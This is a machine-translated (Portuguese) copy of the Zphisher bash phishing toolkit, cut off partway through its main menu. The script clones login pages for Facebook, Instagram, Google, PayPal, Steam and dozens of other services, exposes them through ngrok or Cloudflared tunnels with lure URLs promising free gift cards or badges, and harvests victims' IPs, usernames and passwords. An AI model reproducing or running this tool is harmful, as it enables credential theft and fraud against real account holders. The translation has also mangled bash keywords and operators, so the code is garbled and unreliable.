#! / bin / bash

# # Zphisher: ferramenta automatizada de phishing
# # Autor: TAHMID RAYAT
# # Versão: 2.2
# # Github: https://github.com/htr-tech

# # OBRIGADO A:
# # Aditya Shakya - https://github.com/adi1090x
# # 1RaY-1 - https://github.com/1RaY-1
# # Moises Tapia - https://github.com/MoisesTapia
# # TheLinuxChoice - https://twitter.com/linux_choice
# # DarksecDevelopers - https://github.com/DarksecDevelopers
# # Ignitetch - https://github.com/Ignitetch/AdvPhishing
# # Võ Ngọc Bảo - https://github.com/vongocbao
# # Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009


# # Se você copiar, dê os créditos :)



# # LICENÇA PÚBLICA GERAL GNU
# # Versão 3, 29 de junho de 2007
# #
# # Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
# # Todos estão autorizados a copiar e distribuir cópias literais
# # deste documento de licença, mas não é permitido alterá-lo.
# #
# # Preâmbulo
# #
# # A GNU General Public License é uma licença copyleft gratuita para
# # software e outros tipos de trabalhos.
# #
# # As licenças para a maioria dos softwares e outros trabalhos práticos são projetadas
# # para tirar sua liberdade de compartilhar e alterar as obras. Por contraste,
# # a GNU General Public License se destina a garantir a sua liberdade de
# # compartilhe e altere todas as versões de um programa - para garantir que ele permaneça gratuito
# # software para todos os seus usuários. Nós, a Free Software Foundation, usamos o
# # Licença Pública Geral GNU para a maioria de nosso software; aplica-se também a
# # qualquer outro trabalho lançado dessa forma por seus autores. Você pode aplicá-lo a
# # seus programas também.
# #
# # Quando falamos de software livre, estamos nos referindo à liberdade, não
# # preço. Nossas Licenças Públicas Gerais são projetadas para garantir que você
# # têm a liberdade de distribuir cópias de software livre (e cobrar por
# # se desejar), que você recebe o código-fonte ou pode obtê-lo se você
# # deseja, que você possa alterar o software ou usar partes dele em novos
# # programas gratuitos e que você sabe que pode fazer essas coisas.
# #
# # Para proteger seus direitos, precisamos impedir que outros neguem você
# # esses direitos ou pedindo a você que renuncie a eles. Portanto, você tem
# # certas responsabilidades se você distribuir cópias do software, ou se
# # você modifica: responsabilidades de respeitar a liberdade dos outros.
# #
# # Por exemplo, se você distribuir cópias de tal programa, seja
# # grátis ou por uma taxa, você deve repassar aos destinatários o mesmo
# # liberdades que você recebeu. Você deve certificar-se de que eles também recebam
# # ou pode obter o código-fonte. E você deve mostrar a eles esses termos para que eles
# # conheça seus direitos.
# #
# # Os desenvolvedores que usam a GNU GPL protegem seus direitos em duas etapas:
# # (1) reivindicar direitos autorais sobre o software, e (2) oferecer a você esta Licença
# # dando a você permissão legal para copiá-lo, distribuí-lo e / ou modificá-lo.
# #
# # Para a proteção dos desenvolvedores e autores, a GPL explica claramente
# # que não há garantia para este software gratuito. Para os usuários e
# # por causa dos autores, a GPL requer que as versões modificadas sejam marcadas como
# # mudou, de modo que seus problemas não sejam atribuídos erroneamente a
# # autores de versões anteriores.
# #
# # Alguns dispositivos são projetados para negar aos usuários o acesso para instalar ou executar
# # versões modificadas do software dentro delas, embora o fabricante
# # pode fazer isso. Isso é fundamentalmente incompatível com o objetivo de
# # protegendo a liberdade dos usuários de alterar o software. O sistemático
# # padrão de tal abuso ocorre na área de produtos para que os indivíduos
# # uso, que é precisamente onde é mais inaceitável. Portanto, nós
# # projetou esta versão da GPL para proibir a prática para aqueles
# # produtos. Se esses problemas surgirem substancialmente em outros domínios, nós
# # estamos prontos para estender esta disposição a esses domínios em versões futuras
# # da GPL, conforme necessário para proteger a liberdade dos usuários.
# #
# # Finalmente, todo programa é constantemente ameaçado por patentes de software.
# # Os Estados não devem permitir que as patentes restrinjam o desenvolvimento e uso de
# # software em computadores de uso geral, mas naqueles que o fazem, desejamos
# # evitar o perigo especial de que patentes aplicadas a um programa gratuito possam
# # torná-lo efetivamente proprietário. Para evitar isso, a GPL garante que
# # patentes não podem ser usadas para tornar o programa não-livre.
# #
# # Os termos e condições precisos para cópia, distribuição e
# # modificação a seguir.
# #
# # Copyright (C) 2021 HTR-TECH (https://github.com/htr-tech)
# #


# # Cores ANSI (FG e BG)
VERMELHO = " $ ( printf ' \ 033 [31m ' ) "   VERDE = " $ ( printf ' \ 033 [32m ' ) "   ORANGE = " $ ( printf ' \ 033 [33m ' ) "   AZUL = " $ ( printf ' \ 033 [34m ' ) "
MAGENTA = " $ ( printf ' \ 033 [35m ' ) "   CYAN = " $ ( printf ' \ 033 [36m ' ) "   BRANCO = " $ ( printf ' \ 033 [37m ' ) " PRETO = " $ ( printf ' \ 033 [30m ' ) "
REDBG = " $ ( printf ' \ 033 [41m ' ) "   GREENBG = " $ ( printf ' \ 033 [42m ' ) "   ORANGEBG = " $ ( printf ' \ 033 [43m ' ) "   BLUEBG = " $ ( printf ' \ 033 [44m ' ) "
MAGENTABG = " $ ( printf ' \ 033 [45m ' ) "   CYANBG = " $ ( printf ' \ 033 [46m ' ) "   WHITEBG = " $ ( printf ' \ 033 [47m ' ) " BLACKBG = " $ ( printf ' \ 033 [40m ' ) "
RESETBG = " $ ( printf ' \ e [0m \ n ' ) "

# # Diretórios
if [[ !  -d  " .server " ]] ;  então
	mkdir -p " .server "
fi
if [[ -d  " .server / www " ]] ;  então
	rm -rf " .server / www "
	mkdir -p " .server / www "
outro
	mkdir -p " .server / www "
fi
if [[ -e  " .cld.log " ]] ;  então
	rm -rf " .cld.log "
fi

# # Término do script
exit_on_signal_SIGINT () {
    { printf  " \ n \ n% s \ n \ n "  " $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Programa interrompido. "  2> & 1 ; reset_color ; }
    saída 0
}

exit_on_signal_SIGTERM () {
    { printf  " \ n \ n% s \ n \ n "  " $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Programa encerrado. "  2> & 1 ; reset_color ; }
    saída 0
}

armadilha exit_on_signal_SIGINT SIGINT
armadilha exit_on_signal_SIGTERM SIGTERM

# # Redefina as cores do terminal
reset_color () {
	tput sgr0    # redefinir atributos
	tput op      # reset color
    Retorna
}

# # Mate o processo já em execução
kill_pid () {
	se [[ ` pidof php ` ]] ;  então
		killall php > / dev / null 2> & 1
	fi
	se [[ ` pidof ngrok ` ]] ;  então
		killall ngrok > / dev / null 2> & 1
	fi
	se [[ ` pidof cloudflared ` ]] ;  então
		killall cloudflared > / dev / null 2> & 1
	fi
}

# # Banner
banner () {
	gato << - EOF
		$ {ORANGE}
		$ {ORANGE} ______ _ _ _               
		$ {ORANGE} | ___ / | | (_) | |              
		$ {ORANGE} / / _ __ | | __ _ ___ | | __ ___ _ __
		$ {ORANGE} / / | '_ \ | '_ \ | / __ | '_ \ / _ \' __ |
		$ {ORANGE} / / __ | | _) | | | | \ __ \ | | | __ / |   
		$ {ORANGE} / _____ | .__ / | _ | | _ | _ | ___ / _ | | _ | \ ___ | _ |   
		$ {ORANGE} | |                                
		$ {ORANGE} | _ | Versão $ {RED}: 2.2
		$ {GREEN} [$ {WHITE} - $ {GREEN}] $ {CYAN} Ferramenta criada por htr-tech (tahmid.rayat) $ {WHITE}
	EOF
}

# # Banner pequeno
banner_small () {
	gato << - EOF
		$ {BLUE}
		$ {BLUE} ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		$ {BLUE} ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		$ {BLUE} ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀ $ {WHITE} 2.2
	EOF
}

# # Dependências
dependencies () {
	echo -e " \ n $ {GREEN} [ $ {WHITE} + $ {GREEN} ] $ {CYAN} Instalando os pacotes necessários ... "

    if [[ -d  " /data/data/com.termux/files/home " ]] ;  então
        se [[ ` proot comando -v ` ]] ;  então
            printf  ' '
        outro
			echo -e " \ n $ {GREEN} [ $ {WHITE} + $ {GREEN} ] $ {CYAN} Pacote de instalação: $ {ORANGE} proot $ {CYAN} " $ {WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	se [[ ` php -v `  &&  ` comando -v wget `  &&  ` comando -v onda `  &&  ` unzip comando -v ` ]] ;  então
		echo -e " \ n $ {GREEN} [ $ {WHITE} + $ {GREEN} ] $ {GREEN} Pacotes já instalados. "
	outro
		pkgs = (php curl wget unzip)
		para  pacotes  em  " $ {pkgs [@]} " ;  Faz
			digite -p " $ pkg "  & > / dev / null || {
				echo -e " \ n $ {GREEN} [ $ {WHITE} + $ {GREEN} ] $ {CYAN} Pacote de instalação: $ {ORANGE} $ pkg $ {CYAN} " $ {WHITE}
				se [[ ` pkg comando -v ` ]] ;  então
					pkg install " $ pkg " -y
				elif [[ ` comando -v apto ` ]] ;  então
					apt instalar " $ pkg " -y
				elif [[ ` command -v apt- get` ]] ;  então
					apt-get install " $ pkg " -y
				elif [[ ` pacman comando -v ` ]] ;  então
					sudo pacman -S " $ pkg " --noconfirm
				elif [[ ` comando -v dnf ` ]] ;  então
					sudo dnf -y install " $ pkg "
				outro
					echo -e " \ n $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Gerenciador de pacotes não suportado, instale os pacotes manualmente. "
					{reset_color ;  saída 1 ; }
				fi
			}
		feito
	fi

}

# # Baixe o Ngrok
download_ngrok () {
	url = " $ 1 "
	file = ` basename $ url `
	if [[ -e  " $ arquivo " ]] ;  então
		rm -rf " $ file "
	fi
	wget --no-check-certificate " $ url "  > / dev / null 2> & 1
	if [[ -e  " $ arquivo " ]] ;  então
		descompacte " $ file "  > / dev / null 2> & 1
		mv -f ngrok .server / ngrok > / dev / null 2> & 1
		rm -rf " $ file "  > / dev / null 2> & 1
		chmod + x .server / ngrok > / dev / null 2> & 1
	outro
		echo -e " \ n $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Ocorreu um erro, instale o Ngrok manualmente. "
		{reset_color ;  saída 1 ; }
	fi
}

# # Baixar Cloudflared
download_cloudflared () {
	url = " $ 1 "
	file = ` basename $ url `
	if [[ -e  " $ arquivo " ]] ;  então
		rm -rf " $ file "
	fi
	wget --no-check-certificate " $ url "  > / dev / null 2> & 1
	if [[ -e  " $ arquivo " ]] ;  então
		mv -f " $ file " .server / cloudflared > / dev / null 2> & 1
		chmod + x .server / cloudflared > / dev / null 2> & 1
	outro
		echo -e " \ n $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Ocorreu um erro, instale o Cloudflared manualmente. "
		{reset_color ;  saída 1 ; }
	fi
}

# # Instale o ngrok
install_ngrok () {
	if [[ -e  " .server / ngrok " ]] ;  então
		echo -e " \ n $ {GREEN} [ $ {WHITE} + $ {GREEN} ] $ {GREEN} Ngrok já instalado. "
	outro
		echo -e " \ n $ {GREEN} [ $ {WHITE} + $ {GREEN} ] $ {CYAN} Instalando o ngrok ... " $ {WHITE}
		arco = ` -m uname `
		if [[( " $ arch " == * ' arm ' * ) || ( " $ arch " == * ' Android ' * )]] ;  então
			download_ngrok ' https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip '
		elif [[ " $ arch "  ==  * ' aarch64 ' * ]] ;  então
			download_ngrok ' https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip '
		elif [[ " $ arch "  ==  * ' x86_64 ' * ]] ;  então
			download_ngrok ' https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip '
		outro
			download_ngrok ' https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip '
		fi
	fi

}

# # Instalar Cloudflared
install_cloudflared () {
	if [[ -e  " .server / cloudflared " ]] ;  então
		echo -e " \ n $ {GREEN} [ $ {WHITE} + $ {GREEN} ] $ {GREEN} Cloudflared já instalado. "
	outro
		echo -e " \ n $ {GREEN} [ $ {WHITE} + $ {GREEN} ] $ {CYAN} Instalando Cloudflared ... " $ {WHITE}
		arco = ` -m uname `
		if [[( " $ arch " == * ' arm ' * ) || ( " $ arch " == * ' Android ' * )]] ;  então
			download_cloudflared ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm '
		elif [[ " $ arch "  ==  * ' aarch64 ' * ]] ;  então
			download_cloudflared ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 '
		elif [[ " $ arch "  ==  * ' x86_64 ' * ]] ;  então
			download_cloudflared ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 '
		outro
			download_cloudflared ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 '
		fi
	fi

}

# # Mensagem de saída
msg_exit () {
	{claro ; banner ;  eco ; }
	echo -e " $ {GREENBG} $ {BLACK} Obrigado por usar esta ferramenta. Tenha um bom dia. $ {RESETBG} \ n "
	{reset_color ;  saída 0 ; }
}

# # Sobre
sobre () {
	{claro ; banner ;  eco ; }
	gato << - EOF
		$ {GREEN} Autor $ {RED}: $ {ORANGE} TAHMID RAYAT $ {RED} [$ {ORANGE} HTR-TECH $ {RED}]
		$ {GREEN} Github $ {RED}: $ {CYAN} https://github.com/htr-tech
		$ {GREEN} Social $ {RED}: $ {CYAN} https://linktr.ee/tahmid.rayat
		$ {GREEN} Versão $ {RED}: $ {ORANGE} 2.2
		$ {REDBG} $ {WHITE} Obrigado: Adi1090x, MoisesTapia, ThelinuxChoice
								  DarkSecDevelopers, Mustakim Ahmed, 1RaY-1 $ {RESETBG}
		$ {RED} Aviso: $ {WHITE}
		$ {CYAN} Esta ferramenta é feita apenas para fins educacionais $ {RED}! $ {WHITE}
		$ {CYAN} O autor não será responsável por qualquer uso indevido deste kit de ferramentas $ {RED}! $ {WHITE}
		$ {RED} [$ {WHITE} 00 $ {RED}] $ {ORANGE} Menu principal $ {RED} [$ {WHITE} 99 $ {RED}] $ {ORANGE} Sair
	EOF

	leia -p " $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Selecione uma opção: $ {BLUE} "

	caso  $ REPLY  em 
		99)
			msg_exit ;;
		0 | 00)
			echo -ne " \ n $ {GREEN} [ $ {WHITE} + $ {GREEN} ] $ {CYAN} Retornando ao menu principal ... "
			{dormir 1 ; main_menu ; } ;;
		* )
			echo -ne " \ n $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Opção inválida, tente novamente ... "
			{dormir 1 ; sobre ; } ;;
	esac
}

# # Configure o site e inicie o servidor php
HOST = ' 127.0.0.1 '
PORT = ' 8080 '

setup_site () {
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {BLUE} Configurando servidor ... " $ {WHITE}
	cp -rf .sites / " $ website " / * .server / www
	cp -f .sites / ip.php .server / www /
	echo -ne " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {BLUE} Iniciando servidor PHP ... " $ {WHITE}
	cd .server / www && php -S " $ HOST " : " $ PORT "  > / dev / null 2> & 1  & 
}

# # Obter endereço IP
capture_ip () {
	IP = $ ( grep -a ' IP: ' .server / www / ip.txt | cut -d "  " -f2 | tr -d ' \ r ' )
	IFS = $ ' \ n '
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} IP da vítima: $ {BLUE} $ IP "
	echo -ne " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {BLUE} Salvo em: $ {ORANGE} ip.txt "
	cat .server / www / ip.txt >> ip.txt
}

# # Obtenha credenciais
capture_creds () {
	ACCOUNT = $ ( grep -o ' Nome de usuário:. * ' .Server / www / usernames.txt | cut -d "  " -f2 )
	PASSWORD = $ ( grep -o ' Pass:. * ' .Server / www / usernames.txt | cut -d " : " -f2 )
	IFS = $ ' \ n '
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Conta: $ {BLUE} $ ACCOUNT "
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Senha: $ {BLUE} $ PASSWORD "
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {BLUE} Salvo em: $ {ORANGE} usernames.dat "
	cat .server / www / usernames.txt >> usernames.dat
	echo -ne " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {ORANGE} Esperando pela próxima informação de login, $ {BLUE} Ctrl + C $ {ORANGE} para sair. "
}

# # Imprimir dados
capture_data () {
	echo -ne " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {ORANGE} Aguardando informações de login, $ {BLUE} Ctrl + C $ {ORANGE} para sair ... "
	enquanto  verdadeiro ;  Faz
		if [[ -e  " .server / www / ip.txt " ]] ;  então
			echo -e " \ n \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} IP da vítima encontrado! "
			capture_ip
			rm -rf .server / www / ip.txt
		fi
		dormir 0,75
		if [[ -e  " .server / www / usernames.txt " ]] ;  então
			echo -e " \ n \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Informação de login encontrada !! "
			capture_creds
			rm -rf .server / www / usernames.txt
		fi
		dormir 0,75
	feito
}

# # Comece o ngrok
start_ngrok () {
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Inicializando ... $ {GREEN} ( $ {CYAN} http: // $ HOST : $ PORT  $ {GREEN } ) "
	{dormir 1 ; setup_site ; }
	echo -ne " \ n \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Iniciando Ngrok ... "

    se [[ ` comando -v termux-chroot ` ]] ;  então
        sleep 2 && termux-chroot ./.server/ngrok http " $ HOST " : " $ PORT "  > / dev / null 2> & 1  &  # Agradecimentos a Mustakim Ahmed (https://github.com/BDhackers009)
    outro
        sleep 2 && ./.server/ngrok http " $ HOST " : " $ PORT "  > / dev / null 2> & 1  &
    fi

	{dormir 8 ; claro ; banner_small ; }
	ngrok_url = $ ( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o " https: // [-0-9a-z] * \. ngrok.io " )
	ngrok_url1 = $ {ngrok_url # https : // }
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {BLUE} URL 1: $ {GREEN} $ ngrok_url "
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {BLUE} URL 2: $ {GREEN} $ mask @ $ ngrok_url1 "
	capture_data
}


# # NÃO COPIE A PASTA SEM CREDIT DUDE: ')

# # Iniciar Cloudflared
start_cloudflared () {
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Inicializando ... $ {GREEN} ( $ {CYAN} http: // $ HOST : $ PORT  $ {GREEN } ) "
	{dormir 1 ; setup_site ; }
	echo -ne " \ n \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Iniciando Cloudflared ... "

    se [[ ` comando -v termux-chroot ` ]] ;  então
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url " $ HOST " : " $ PORT " --logfile .cld.log > / dev / null 2> & 1  &
    outro
        sleep 2 && ./.server/cloudflared tunnel -url " $ HOST " : " $ PORT " --logfile .cld.log > / dev / null 2> & 1  &
    fi

	{dormir 8 ; claro ; banner_small ; }
	
	cldflr_link = $ ( grep -o ' https: // [-0-9a-z] * \. trycloudflare.com '  " .cld.log " )
	cldflr_link1 = $ {cldflr_link # https : // }
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {BLUE} URL 1: $ {GREEN} $ cldflr_link "
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {BLUE} URL 2: $ {GREEN} $ mask @ $ cldflr_link1 "
	capture_data
}

# # Iniciar localhost
start_localhost () {
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Inicializando ... $ {GREEN} ( $ {CYAN} http: // $ HOST : $ PORT  $ {GREEN } ) "
	setup_site
	{dormir 1 ; claro ; banner_small ; }
	echo -e " \ n $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Hospedado com sucesso em: $ {GREEN} $ {CYAN} http: // $ HOST : $ PORT  $ {GREEN} "
	capture_data
}

# # Seleção de túnel
tunnel_menu () {
	{claro ; banner_small ; }
	gato << - EOF
		$ {RED} [$ {WHITE} 01 $ {RED}] $ {ORANGE} Localhost $ {RED} [$ {CYAN} para desenvolvedores $ {RED}]
		$ {RED} [$ {WHITE} 02 $ {RED}] $ {ORANGE} Ngrok.io $ {RED} [$ {CYAN} Buggy $ {RED}]
		$ {RED} [$ {WHITE} 03 $ {RED}] $ {ORANGE} Cloudflared $ {RED} [$ {CYAN} NOVO! $ {RED}]
	EOF

	leia -p " $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Selecione um serviço de encaminhamento de porta: $ {BLUE} "

	caso  $ REPLY  em 
		1 01)
			start_localhost ;;
		2 | 02)
			start_ngrok ;;
		3 | 03)
			start_cloudflared ;;
		* )
			echo -ne " \ n $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Opção inválida, tente novamente ... "
			{dormir 1 ; tunnel_menu ; } ;;
	esac
}

# # Facebook
site_facebook () {
	gato << - EOF
		$ {RED} [$ {WHITE} 01 $ {RED}] $ {ORANGE} Página de login tradicional
		$ {RED} [$ {WHITE} 02 $ {RED}] $ {ORANGE} Página de login da votação avançada
		$ {RED} [$ {WHITE} 03 $ {RED}] $ {ORANGE} Página de login de segurança falsa
		$ {RED} [$ {WHITE} 04 $ {RED}] $ {ORANGE} Página de login do Facebook Messenger
	EOF

	leia -p " $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Selecione uma opção: $ {BLUE} "

	caso  $ REPLY  em 
		1 01)
			site = " facebook "
			mask = ' http: // blue-verification-badge-for-facebook-free '
			tunnel_menu ;;
		2 | 02)
			website = " fb_advanced "
			mask = ' http: // vote-for-the-best-social-media '
			tunnel_menu ;;
		3 | 03)
			website = " fb_security "
			mask = ' http: // make-your-facebook-protected-and-free-from-hackers '
			tunnel_menu ;;
		4 04)
			website = " fb_messenger "
			mask = ' http: // get-messenger-premium-features-free '
			tunnel_menu ;;
		* )
			echo -ne " \ n $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Opção inválida, tente novamente ... "
			{dormir 1 ; claro ; banner_small ; site_facebook ; } ;;
	esac
}

# # Instagram
site_instagram () {
	gato << - EOF
		$ {RED} [$ {WHITE} 01 $ {RED}] $ {ORANGE} Página de login tradicional
		$ {RED} [$ {WHITE} 02 $ {RED}] $ {ORANGE} Página de login de seguidores automáticos
		$ {RED} [$ {WHITE} 03 $ {RED}] $ {ORANGE} Página de login de 1000 seguidores
		$ {RED} [$ {WHITE} 04 $ {RED}] $ {ORANGE} Selo azul Verificar página de login
	EOF

	leia -p " $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Selecione uma opção: $ {BLUE} "

	caso  $ REPLY  em 
		1 01)
			website = " instagram "
			mask = ' http: // get-ilimitado-seguidores-para-instagram '
			tunnel_menu ;;
		2 | 02)
			website = " ig_followers "
			mask = ' http: // get-ilimitado-seguidores-para-instagram '
			tunnel_menu ;;
		3 | 03)
			website = " insta_followers "
			mask = ' http: // get-1000-Followers-for-instagram '
			tunnel_menu ;;
		4 04)
			website = " ig_verify "
			mask = ' http: // blue-badge-verify-for-instagram-free '
			tunnel_menu ;;
		* )
			echo -ne " \ n $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Opção inválida, tente novamente ... "
			{dormir 1 ; claro ; banner_small ; site_instagram ; } ;;
	esac
}

# # Gmail / Google
site_gmail () {
	gato << - EOF
		$ {RED} [$ {WHITE} 01 $ {RED}] $ {ORANGE} Página de login antiga do Gmail
		$ {RED} [$ {WHITE} 02 $ {RED}] $ {ORANGE} Nova página de login do Gmail
		$ {RED} [$ {WHITE} 03 $ {RED}] $ {ORANGE} Enquete de votação avançada
	EOF

	leia -p " $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Selecione uma opção: $ {BLUE} "

	caso  $ REPLY  em 
		1 01)
			site = " google "
			mask = ' http: // get-unlimited-google-drive-free '
			tunnel_menu ;;		
		2 | 02)
			website = " google_new "
			mask = ' http: // get-unlimited-google-drive-free '
			tunnel_menu ;;
		3 | 03)
			website = " google_poll "
			mask = ' http: // vote-for-the-best-social-media '
			tunnel_menu ;;
		* )
			echo -ne " \ n $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Opção inválida, tente novamente ... "
			{dormir 1 ; claro ; banner_small ; site_gmail ; } ;;
	esac
}

# # Vk
site_vk () {
	gato << - EOF
		$ {RED} [$ {WHITE} 01 $ {RED}] $ {ORANGE} Página de login tradicional
		$ {RED} [$ {WHITE} 02 $ {RED}] $ {ORANGE} Página de login da votação avançada
	EOF

	leia -p " $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Selecione uma opção: $ {BLUE} "

	caso  $ REPLY  em 
		1 01)
			website = " vk "
			mask = ' http: // vk-premium-real-method-2020 '
			tunnel_menu ;;
		2 | 02)
			website = " vk_poll "
			mask = ' http: // vote-for-the-best-social-media '
			tunnel_menu ;;
		* )
			echo -ne " \ n $ {RED} [ $ {WHITE} ! $ {RED} ] $ {RED} Opção inválida, tente novamente ... "
			{dormir 1 ; claro ; banner_small ; site_vk ; } ;;
	esac
}

# # Menu
main_menu () {
	{claro ; banner ;  eco ; }
	gato << - EOF
		$ {RED} [$ {WHITE} :: $ {RED}] $ {ORANGE} Selecione um ataque para sua vítima $ {RED} [$ {WHITE} :: $ {RED}] $ {ORANGE}
		$ {RED} [$ {WHITE} 01 $ {RED}] $ {ORANGE} Facebook $ {RED} [$ {WHITE} 11 $ {RED}] $ {ORANGE} Twitch $ {RED} [$ {WHITE} 21 $ {RED}] $ {ORANGE} DeviantArt
		$ {RED} [$ {WHITE} 02 $ {RED}] $ {ORANGE} Instagram $ {RED} [$ {WHITE} 12 $ {RED}] $ {ORANGE} Pinterest $ {RED} [$ {WHITE} 22 $ {RED}] $ {ORANGE} Badoo
		$ {RED} [$ {WHITE} 03 $ {RED}] $ {ORANGE} Google $ {RED} [$ {WHITE} 13 $ {RED}] $ {ORANGE} Snapchat $ {RED} [$ {WHITE} 23 Origem $ {RED}] $ {ORANGE}
		$ {RED} [$ {WHITE} 04 $ {RED}] $ {ORANGE} Microsoft $ {RED} [$ {WHITE} 14 $ {RED}] $ {ORANGE} Linkedin $ {RED} [$ {WHITE} 24 $ {RED}] $ {ORANGE} DropBox	
		$ {RED} [$ {WHITE} 05 $ {RED}] $ {ORANGE} Netflix $ {RED} [$ {WHITE} 15 $ {RED}] $ {ORANGE} Ebay $ {RED} [$ {WHITE} 25 $ {RED}] $ {ORANGE} Yahoo		
		$ {RED} [$ {WHITE} 06 $ {RED}] $ {ORANGE} Paypal $ {RED} [$ {WHITE} 16 $ {RED}] $ {ORANGE} Quora $ {RED} [$ {WHITE} 26 $ {RED}] $ {ORANGE} Wordpress
		$ {RED} [$ {WHITE} 07 $ {RED}] $ {ORANGE} Steam $ {RED} [$ {WHITE} 17 $ {RED}] $ {ORANGE} Protonmail $ {RED} [$ {WHITE} 27 $ {RED}] $ {ORANGE} Yandex			
		$ {RED} [$ {WHITE} 08 $ {RED}] $ {ORANGE} Twitter $ {RED} [$ {WHITE} 18 $ {RED}] $ {ORANGE} Spotify $ {RED} [$ {WHITE} 28 $ {RED}] $ {ORANGE} StackoverFlow
		$ {RED} [$ {WHITE} 09 $ {RED}] $ {ORANGE} Playstation $ {RED} [$ {WHITE} 19 $ {RED}] $ {ORANGE} Reddit $ {RED} [$ {WHITE} 29 $ {RED}] $ {ORANGE} Vk
		$ {RED} [$ {WHITE} 10 $ {RED}] $ {ORANGE} Tiktok $ {RED} [$ {WHITE} 20 $ {RED}] $ {ORANGE} Adobe $ {RED} [$ {WHITE} 30 $ {RED}] $ {ORANGE} XBOX
		$ {RED} [$ {WHITE} 31 $ {RED}] $ {ORANGE} Mediafire $ {RED} [$ {WHITE} 32 $ {RED}] $ {ORANGE} Gitlab $ {RED} [$ {WHITE} 33 $ {RED}] $ {ORANGE} Github
		$ {RED} [$ {WHITE} 99 $ {RED}] $ {ORANGE} Sobre $ {RED} [$ {WHITE} 00 $ {RED}] $ {ORANGE} Sair
	EOF
	
	leia -p " $ {RED} [ $ {WHITE} - $ {RED} ] $ {GREEN} Selecione uma opção: $ {BLUE} "

	caso  $ REPLY  em 
		1 01)
			site_facebook ;;
		2 | 02)
			site_instagram ;;
		3 | 03)
			site_gmail ;;
		4 04)
			website = " microsoft "
			mask = ' http: // unlimited-onedrive-space-for-free '
			tunnel_menu ;;
		5 | 05)
			website = " netflix "
			mask = ' http: // upgrade-your-netflix-plan-free '
			tunnel_menu ;;
		6 06)
			website = " paypal "
			mask = ' http: // get-500-usd-free-to-your-acount '
			tunnel_menu ;;
		7 07)
			website = " Steam "
			mask = ' http: // steam-500-usd-gift-card-free '
			tunnel_menu ;;
		8 08)
			site = " twitter "
			mask = ' http: // get-blue-badge-on-twitter-free '
			tunnel_menu ;;
		9 09)
			website = " playstation "
			mask = ' http: // playstation-500-usd-gift-card-free '
			tunnel_menu ;;
		10)
			website = " tiktok "
			mask = ' http: // tiktok-free-liker '
			tunnel_menu ;;
		11)
			website = " twitch "
			mask = ' http: // unlimited-twitch-tv-user-for-free '
			tunnel_menu ;;
		12)
			website = " pinterest "
			mask = ' http: // get-a-premium-plan-for-pinterest-free '
			tunnel_menu ;;
		13)
			website = " snapchat "
			mask = ' http: // view-locked-snapchat-accounts-secretly '
			tunnel_menu ;;
		14)
			website = " linkedin "
			mask = ' http: // get-a-premium-plan-for-linkedin-free '
			tunnel_menu ;;
		15)
			website = " ebay "
			mask = ' http: // get-500-usd-free-to-your-acount '
			tunnel_menu ;;
		16)
			website = " quora "
			mask = ' http: // quora-premium-for-free '
			tunnel_menu ;;
		17)
			website = " protonmail "
			mask = ' http: // protonmail-pro-basics-for-free '
			tunnel_menu ;;
		18)
			website = " spotify "
